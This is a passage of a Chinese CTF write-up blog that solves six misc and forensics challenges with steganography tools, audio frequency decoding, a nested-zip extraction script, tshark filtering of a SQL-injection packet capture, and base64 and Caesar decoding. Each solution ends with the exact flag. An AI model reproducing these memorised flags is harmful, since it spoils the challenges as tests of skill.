+<h3 id="35、-BJDCTF-2nd-Real-EasyBaBa"><a href="#35、-BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="35、[BJDCTF 2nd]Real_EasyBaBa"></a>35、[BJDCTF 2nd]Real_EasyBaBa</h3><p>使用010editor打开 在右侧的小框中 发现了字符画 得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BJD&#123;572154976&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="36、-DASCTF-X-CBCTF-2023｜无畏者先行-justlisten"><a href="#36、-DASCTF-X-CBCTF-2023｜无畏者先行-justlisten" class="headerlink" title="36、[DASCTF X CBCTF 2023｜无畏者先行]justlisten"></a>36、[DASCTF X CBCTF 2023｜无畏者先行]justlisten</h3><p>二维码一眼汉信码 解码之后得到的内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0urS3cret<br></code></pre></td></tr></table></figure>
+<p>则利用oursecret工具 对bmp文件进行处理 密码就是0urS3cret<br>得到字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0urS3cret<br></code></pre></td></tr></table></figure>
+<ol start="4">
+<li>打开音频, 留意到这个37.8秒的音频中, 每0.1秒都会有一个固定频率。</li>
+</ol>
+<p>因此思路是先分成378段, 然后统计频率数量。</p>
+<p>这里简单讲讲我的粗糙实现方法：先是读入数据, 然后每4410分一段, 然后考虑到直接做傅里叶变换可能不会出来一些稀疏系数(也就是可能不能直接看出来具体的精准频率)。所以我做的方法是, 对每个序列的第二个值(第一个值全部为0)进行统计, (复制到excel中, 然后去除重复值)发现一共只有10种不同的值。因此可以推断只有10种频率, 直接就把378行映射成378个值。按照从小到大的顺序对这10个频率分别编码成0-9</p>
+<p>提取出数字序列如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">090003090700030910000310000710030710002207031005192203203432284426284735274836292742424842463147282734424837362942334607200806240618111002131804010009201403081110001813210014112205130210200100062118140837333628131003010921082018040805110700221310210109100321110418100005131000221514051415000514292644284531644807521819110813066219616228141321042462081305141712001952141367676763<br></code></pre></td></tr></table></figure>
+
+
+<p>留意到378&#x3D;189*2, 后面的统计也发现, 如果两位为一个数, 则没有超过68的数字, 猜测每两位组成字母表对应的一个位置。</p>
+<p>尝试解密, 得到如下结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">jadjhadjkadkahkdhkawhdkftwduIGCSACVJBWKDBQQWQUFVCBIQWLKDQHUhuigygslkcnsebajuodilkasnvaolwfnckubagvsoiLHKCnkdbjviuseiflhawnkvbjkdvleskafnkawpofopafoDASCTF&#123;Wh1stling_t0_Convey_informat1on!!!&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="37、-DASCTF-Oct-X-吉林工师-欢迎来到魔法世界～-giveyourflag"><a href="#37、-DASCTF-Oct-X-吉林工师-欢迎来到魔法世界～-giveyourflag" class="headerlink" title="37、[DASCTF Oct X 吉林工师 欢迎来到魔法世界～]giveyourflag"></a>37、[DASCTF Oct X 吉林工师 欢迎来到魔法世界～]giveyourflag</h3><p>压缩包嵌套<br>重复解压缩即可<br>python脚本如下 切记要单独放在一个文件夹里 在桌面解压直接给我干报废了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br>f = zipfile.ZipFile(<span class="hljs-string">&quot;flag1&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        name = f.namelist()[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(name)<br>        f.extractall()<br>        f = zipfile.ZipFile(name, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
+<p>然后会得到一串base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">R0RWRldJezdnZ3FnbGwzanl1a2RuY3N0aTlpY3BjM2ZlYjB2NW9wfQ==<br></code></pre></td></tr></table></figure>
+<p>解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GDVFWI&#123;7ggqgll3jyukdncsti9icpc3feb0v5op&#125;<br></code></pre></td></tr></table></figure>
+<p>初具雏形 但是前面的flag标志不太正确 按理来说应该是DASCTF<br>凯撒密码解码 在cyberchef中选择 ROT13参数 不勾选Rotate numbers 设置为-3 即可得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">DASCTF&#123;7ddndii3gvrhakzpqf9fzmz3cby0s5lm&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="38、-NewStarCTF-公开赛赛道-最后的流量分析"><a href="#38、-NewStarCTF-公开赛赛道-最后的流量分析" class="headerlink" title="38、[NewStarCTF 公开赛赛道]最后的流量分析"></a>38、[NewStarCTF 公开赛赛道]最后的流量分析</h3><p>sqli.pcap 则猜想应该是和sql注入相关的<br>按包的长度进行排序 发现长度在768及以上的为注入成功的流量包 或者直接搜索flag也可以发现<br>接着使用tshark进行解密即可 注意要在linux系统下运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tshark -r sqli.pcap -T fields -Y &quot;http.request.method==GET or frame.len&gt;765&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt<br></code></pre></td></tr></table></figure>
+<p>然后对导出的data.txt文件 使用python进行处理 导出处理结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>comment = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>	lines = f.readlines()<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lines)):<br>		<span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(lines[i][:<span class="hljs-number">3</span>])&gt;<span class="hljs-number">765</span>:<br>			comment += re.findall(<span class="hljs-string">r&#x27;&quot;(.)&quot;&#x27;</span>, unquote(lines[i-<span class="hljs-number">1</span>]))[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(comment)<br></code></pre></td></tr></table></figure>
+<p>即可获得flag</p>
+<h3 id="39、-NewStarCTF-公开赛赛道-Look-my-eyes"><a href="#39、-NewStarCTF-公开赛赛道-Look-my-eyes" class="headerlink" title="39、[NewStarCTF 公开赛赛道]Look my eyes"></a>39、[NewStarCTF 公开赛赛道]Look my eyes</h3><p>由题目简介中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">请看着我沉默的眼睛<br></code></pre></td></tr></table></figure>
+<p>则silenteye<br>解码之后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ZmxhZ3tMMG9rX20zXzFuX215X2V5M3N9<br></code></pre></td></tr></table></figure>
+<p>直接cyberchef base64 获得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;L0ok_m3_1n_my_ey3s&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="40、-Dest0g3-520迎新赛-StrangeTraffic"><a href="#40、-Dest0g3-520迎新赛-StrangeTraffic" class="headerlink" title="40、[Dest0g3 520迎新赛]StrangeTraffic"></a>40、[Dest0g3 520迎新赛]StrangeTraffic</h3><p>导出tcp流 从服务器分组获取一串密文 同一个首字母的我们只复制最后一组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">R.G.V.z.d.D.B.n.M.3s.z.M.U.E.1.Q.k.V.BN.i.1.G.M.j.B.E.L.UY.x.O.E.E.t.R.T.h.FQ.S.0.y.O.U.I.0.R.jI.1.N.z.E.w.O.E.J.9A.B.C.D.E.F.G.H.I.J<br></code></pre></td></tr></table></figure>
+<p>经过python处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9ABCDEFGHIJ<br></code></pre></td></tr></table></figure>
+<p>然后直接base64 即可得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;<br></code></pre></td></tr></table></figure>
+
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>张岩<br>
+        <strong>本文链接：</strong><a href="http://xxxkkk578.github.io/2024/04/10/CTF/buu_misc/" title="http:&#x2F;&#x2F;xxxkkk578.github.io&#x2F;2024&#x2F;04&#x2F;10&#x2F;CTF&#x2F;buu_misc&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;xxxkkk578.github.io&#x2F;2024&#x2F;04&#x2F;10&#x2F;CTF&#x2F;buu_misc&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF-Misc/" rel="tag">CTF,Misc</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1712681513964"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div></div></body></html>
